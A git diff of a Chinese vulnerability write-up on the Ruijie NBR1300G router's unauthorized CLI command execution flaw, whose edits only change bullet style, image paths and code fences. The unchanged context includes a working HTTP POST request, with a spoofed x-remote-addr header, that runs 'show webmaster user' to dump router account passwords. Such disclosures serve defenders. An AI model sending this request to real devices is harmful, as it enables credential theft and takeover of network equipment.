@@ -6,7 +6,7 @@
 
 参考链接：
 
-- https://github.com/chaitin/xray/blob/master/pocs/ruijie-nbr1300g-cli-password-leak.yml
+* https://github.com/chaitin/xray/blob/master/pocs/ruijie-nbr1300g-cli-password-leak.yml
 
 ## 漏洞影响
 
@@ -24,11 +24,11 @@ title="锐捷网络 --NBR路由器--登录界面"
 
 登录页面如下
 
-![](images/锐捷%20NBR%201300G%20路由器%20越权%20CLI%20命令执行漏洞/file-20240904113419711.png)
+![](../.gitbook/assets/file-20240904113419711.png)
 
 执行 CLI 命令 `show webmaster user` 查看用户配置账号密码：
 
-```plain
+```
 POST /WEB_VMS/LEVEL15/ HTTP/1.1
 Host: 
 Connection: keep-alive
@@ -48,7 +48,7 @@ x-remote-addr: 127.0.0.1
 command=show%webmaster%user&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.
 ```
 
-![](images/锐捷%20NBR%201300G%20路由器%20越权%20CLI%20命令执行漏洞/file-20240904112924288.png)
+![](../.gitbook/assets/file-20240904112924288.png)
 
 ## 漏洞 POC
 
